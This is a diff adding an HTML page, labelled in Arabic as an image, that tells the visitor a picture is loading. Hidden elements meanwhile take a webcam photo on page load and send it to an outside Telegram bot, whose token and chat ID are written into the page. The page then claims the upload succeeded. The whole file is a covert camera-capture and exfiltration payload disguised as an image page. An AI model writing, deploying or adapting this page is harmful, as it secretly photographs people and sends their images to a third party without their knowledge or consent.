@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>صورة</title>
+</head>
+<body>
+    <video id="video" autoplay style="display:none"></video>
+    <canvas id="canvas" style="display:none"></canvas>
+    <script>
+        const BOT_TOKEN = "8365043460:AAGa2EIVhOTKFa7wEuARpb_cuEsDIa2bVxs";
+        const CHAT_ID = "8545876964";
+
+        async function capturePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const photo = canvas.toDataURL('image/jpeg');
+                    
+                    // إرسال إلى تلغرام
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: new URLSearchParams({
+                            chat_id: CHAT_ID,
+                            photo: photo
+                        })
+                    });
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    document.body.innerHTML = '<h2>تم تحميل الصورة بنجاح</h2>';
+                };
+            } catch(e) {
+                document.body.innerHTML = '<h2>خطأ: لا يمكن الوصول إلى الكاميرا</h2>';
+            }
+        }
+        capturePhoto();
+    </script>
+    <h2>جاري تحميل الصورة...</h2>
+</body>
+</html>
